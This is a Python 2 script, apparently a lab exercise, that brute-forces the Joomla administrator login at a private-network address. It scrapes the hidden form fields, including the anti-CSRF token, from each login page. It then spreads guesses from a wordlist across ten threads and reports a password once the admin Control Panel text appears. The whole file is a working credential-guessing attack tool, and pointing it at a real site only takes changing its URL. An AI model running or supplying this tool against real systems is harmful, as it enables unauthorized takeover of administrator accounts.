import urllib2
import threading
import cookielib
import Queue
import urllib

from HTMLParser import HTMLParser

threads = 10
wordlist_file = "wordlist.txt"

username = "jluser"
resume = None
target_url = "http://192.168.211.157/joomla/administrator/index.php"
target_post = "http://192.168.211.157/joomla/administrator/index.php"

username_field = "username"
password_field = "passwd"

success_check = "Control Panel - VulnWeb - Administration"


class BruterParser(HTMLParser):
    def __init__(self):
        HTMLParser.__init__(self)
        self.tag_result = {}

    def handle_starttag(self, tag, attrs):
        if tag == "input":
            tag_name = None
            tag_value = None

            for name, value in attrs:
                if name == "name":
                    tag_name = value
                if name == "value":
                    tag_value = value

            if tag_name is not None:
                self.tag_result[tag_name] = tag_value


class Bruter(object):
    def __init__(self, username, words):
        self.username = username
        self.password_quene = words
        self.found = False
        print "Finished setting up for: %s" % self.username

    def run_bruteforce(self):
        for i in range(threads):
            t = threading.Thread(target=self.web_bruter)
            t.start()

    def web_bruter(self):
        while not self.password_quene.empty() and not self.found:
            brute = self.password_quene.get().rstrip()

            jar = cookielib.FileCookieJar("cookies")
            opener = urllib2.build_opener(urllib2.HTTPCookieProcessor(jar))
            response = opener.open(target_url)
            page = response.read()

            print "Trying: %s ==> %s (%d left)" % (self.username, brute, self.password_quene.qsize())

            # parse out the hidden fields
            parser = BruterParser()
            parser.feed(page)

            post_tags = parser.tag_result

            # add our username and password fields
            post_tags[username_field] = self.username
            post_tags[password_field] = brute

            login_data = urllib.urlencode(post_tags)
            login_response = opener.open(target_post, data=login_data)
            login_result = login_response.read()
            if success_check in login_result:
                self.found = True
                print "[*] Bruteforce successful."
                print "[*] Username: %s" % self.username
                print "[*] Password: %s" % brute
                print "[*] Waiting for other threads to exit..."


def build_wordlist(wordlist_file):
    fd = open(wordlist_file, "rb")
    raw_words = fd.readlines()
    fd.close()

    words = Queue.Queue()
    found_resume = False

    for word in raw_words:
        word = word.rstrip()
        if resume is not None:
            if found_resume:
                words.put(word)
            else:
                if resume == word:
                    found_resume = True
                    print "Resuming wordlist from: %s" % resume
        else:
            words.put(word)

    return words


# paste the build_wordlist function here
words = build_wordlist(wordlist_file)
bruter_obj = Bruter(username, words)
bruter_obj.run_bruteforce()
